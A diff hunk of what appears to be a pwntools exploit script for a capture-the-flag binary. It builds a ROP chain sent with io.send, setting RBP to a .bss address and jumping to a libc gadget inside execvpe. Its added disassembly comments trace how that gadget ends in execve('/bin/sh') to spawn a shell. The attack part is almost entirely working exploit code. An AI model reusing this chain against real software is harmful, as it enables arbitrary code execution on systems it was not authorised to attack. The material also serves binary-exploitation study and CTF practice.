@@ -65,14 +65,24 @@ io.send(flat( # write to .bss again
     libc_base + libc_pop_rbp_offset, 0x404800, # RBP = .bss, must >= 0x404186 when interior 0x4040d0 selected from global_msg
     libc_base + 0xebd43
     # .text:00000000000EBD43                 lea     r10, [rbp+var_50]
-    #   ; R10 = RBP + var_50;
+    # ; R10 = RBP + var_50;
     # .text:00000000000EBD47                 mov     [rbp+var_50], rax
-    #   ; R10 = *(uint64_t *)(RBP + var_50) = RAX = 0;
+    # ; *(uint64_t *)R10 = *(uint64_t *)(RBP + var_50) = RAX = 0;
     # .text:00000000000EBD4B                 jmp     loc_EBC79
-    #
+
     # .text:00000000000EBC79 loc_EBC79:                              ; CODE XREF: execvpe+53B↓j
     # .text:00000000000EBC79                 mov     qword ptr [r10+10h], 0
-    #   ; *(uint64_t *)(R10 + 0x10) = *(uint64_t *)(RBP + var_50 + 0x10) = RAX = 0;
+    # ; *(uint64_t *)(R10 + 0x10) = *(uint64_t *)(RBP + var_50 + 0x10) = RAX = 0;
+    # .text:00000000000EBC81
+    # .text:00000000000EBC81 loc_EBC81:                              ; CODE XREF: execvpe+4D0↓j
+    # .text:00000000000EBC81                 mov     rdx, [rbp+var_70]
+    # ; *(uint64_t *)RDX = *(uint64_t *)(RBP + var_70)  // execve_arg_2
+    # .text:00000000000EBC85                 mov     rsi, r10
+    # ; *(uint64_t *)RSI = 0                            // execve_arg_1
+    # .text:00000000000EBC88                 lea     rdi, aBinSh     ; "/bin/sh"
+    # ; *(uint64_t *)RDI = "/bin/sh"                    // execve_arg_0
+    # .text:00000000000EBC8F                 mov     [rbp+var_78], r9
+    # .text:00000000000EBC93                 call    execve
 ))
 
 io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
